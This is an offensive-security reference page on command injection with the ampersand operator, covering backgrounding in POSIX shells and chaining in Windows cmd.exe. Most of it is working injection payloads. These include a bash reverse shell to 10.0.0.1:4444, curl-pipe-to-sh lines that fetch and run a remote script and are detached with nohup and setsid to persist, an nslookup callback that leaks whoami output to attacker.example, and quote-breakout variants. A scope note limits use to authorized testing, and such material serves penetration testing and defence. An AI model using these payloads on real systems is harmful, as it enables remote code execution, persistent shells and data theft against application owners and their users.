---
title: "Background execution with the ampersand operator"
description: "Using & to detach an injected command so it runs asynchronously, keeping the response fast while a payload executes, and the Windows cmd.exe meaning of & as a separator."
keywords:
  - command injection
  - background execution
  - ampersand operator
  - asynchronous command injection
  - shell injection
  - windows command injection
---

# Background execution (`&`)

A single trailing ampersand tells the shell to run the preceding command **in the background** and return immediately, without waiting for it to finish. In OS command injection this detaches a payload from the request, so a long-running or noisy command executes while the HTTP response comes back on time.

> **Scope.** For authorized penetration tests, red-team engagements, CTF labs, and code review of systems you own or are contracted to assess. Executing commands without written authorization is unlawful.

## Mechanism

In `sh`/`bash`, `cmd &` forks `cmd` into the background and the shell proceeds. Injected into a sink:

```
127.0.0.1 & id
```

The shell backgrounds the (intended) command and runs `id`; control returns without blocking on the first job. Because the parent process need not wait, the application's response is not held open by your payload, useful when a synchronous command would time out the request or stall the worker.

## Asynchronous payloads

Detachment matters most when the payload is slow or should outlive the request. One caveat: when the vulnerable sink **captures output** (`shell_exec()`, `subprocess` with captured stdout/stderr, backticks), a backgrounded job still inherits those pipes, so the caller can block until the job exits even though the shell itself has moved on. Redirect all three standard streams (`</dev/null >/dev/null 2>&1`) so the job is fully detached and the response returns immediately:

```
127.0.0.1 & bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' </dev/null >/dev/null 2>&1 &
127.0.0.1 & (curl http://10.0.0.1/s.sh | sh) </dev/null >/dev/null 2>&1 &
127.0.0.1 & nohup sleep 300 >/dev/null 2>&1 &        # survives the parent exiting
```

Fully detaching from the controlling terminal and streams keeps the job alive after the request ends:

```
127.0.0.1 & setsid sh -c 'curl http://10.0.0.1/s.sh|sh' </dev/null >/dev/null 2>&1 &
```

## Timing and confirmation

A backgrounded job does not delay the response, so `&` is poor for a time-based oracle on its own, use `;` or `&&` with `sleep` when you want the delay to be *observable*. Conversely, `&` is ideal when you want execution **without** changing response time, confirming instead through an out-of-band callback:

```
127.0.0.1 & nslookup $(whoami).OOB_ID.attacker.example &
```

## Context handling

The ampersand is parsed as a control operator only outside quotes; break out first where needed, and combine with `${IFS}` when spaces are filtered:

```
"; id & echo "
127.0.0.1&id          # no spaces required around &
```

## Windows: `&` is a separator

On Windows `cmd.exe` the ampersand does **not** background, it is the unconditional **command separator** (the `cmd` analogue of POSIX `;`):

```
127.0.0.1 & whoami            # runs whoami after ping, sequentially
127.0.0.1 & ping -n 10 127.0.0.1
```

This dual meaning is why `&` is one of the most portable injection characters: it chains on `cmd.exe` and backgrounds on POSIX shells, so a probe containing `&` often triggers execution on either platform.

## References

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
